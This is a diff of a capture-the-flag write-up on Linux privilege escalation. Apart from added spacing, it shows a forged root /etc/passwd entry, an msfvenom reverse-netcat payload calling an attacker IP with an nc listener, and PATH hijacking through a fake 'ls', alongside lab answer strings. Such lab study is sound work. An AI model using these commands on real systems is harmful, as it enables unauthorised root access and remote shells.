@@ -32,21 +32,31 @@ ssh user3@10.10.178.20
 	^C
 ```
 
+<br>
+
 ### Task 4.2
 
 > polobox
+
+<br>
 
 ### Task 4.3
 
 > 8
 
+<br>
+
 ### Task 4.4
 
 > 4
 
+<br>
+
 ### Task 4.5
 
 > autoscript.sh
+
+<br>
 
 ### Task 4.6
 
@@ -62,6 +72,8 @@ ssh user3@10.10.178.20
 ```shell
 	ls -l
 ```
+
+<br>
 
 > /home/user3/shell
 
@@ -84,9 +96,13 @@ ssh user3@10.10.178.20
 		password
 ```
 
+<br>
+
 ### Task 6.2
 
 > vertical
+
+<br>
 
 ### Task 6.3
 
@@ -95,7 +111,11 @@ ssh user3@10.10.178.20
 openssl passwd -1 -salt "new" "123"
 ```
 
+<br>
+
 > $1$new$p7ptkEKU1HnaHpRtzNizS1
+
+<br>
 
 ### Task 6.4
 
@@ -103,6 +123,8 @@ openssl passwd -1 -salt "new" "123"
 ```shell
 	cat /etc/passwd | grep 'root'
 ```
+
+<br>
 
 > new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 
@@ -134,6 +156,8 @@ new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 
 🧰 https://gtfobins.github.io/
 
+<br>
+
 (Terminal 2/ssh:)
 ```shell
 	exit
@@ -141,12 +165,16 @@ new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 		password
 ```
 
+<br>
+
 ### Task 7.2
 
 (Terminal 2/ssh:)
 ```shell
 	sudo -l
 ```
+
+<br>
 
 > NOPASSWD
 
@@ -171,6 +199,8 @@ new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 		password
 ```
 
+<br>
+
 ### Task 8.3
 
 > -p
@@ -182,12 +212,16 @@ new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 msfvenom -p cmd/unix/reverse_netcat lhost=10.14.27.197 lport=8888 R
 ```
 
+<br>
+
 ### Task 8.5
 
 (Terminal 2/ssh:)
 ```shell
 	cat /etc/crontab
 ```
+
+<br>
 
 > /home/user4/Desktop
 
@@ -217,6 +251,8 @@ nc -lvnp 8888
 		password
 ```
 
+<br>
+
 ### Task 9.2
 
 (Terminal 2/ssh:)
@@ -225,6 +261,8 @@ nc -lvnp 8888
 	
 	./script
 ```
+
+<br>
 
 > ls
 
@@ -235,12 +273,16 @@ nc -lvnp 8888
 	cd /tmp/
 ```
 
+<br>
+
 ### Task 9.4
 
 (Terminal 2/ssh:)
 ```shell
 	echo "/bin/bash" > ls
 ```
+
+<br>
 
 > echo "/bin/bash" > ls
 
@@ -250,6 +292,8 @@ nc -lvnp 8888
 ```shell
 	chmod +x ls
 ```
+
+<br>
 
 ### Task 9.5
 
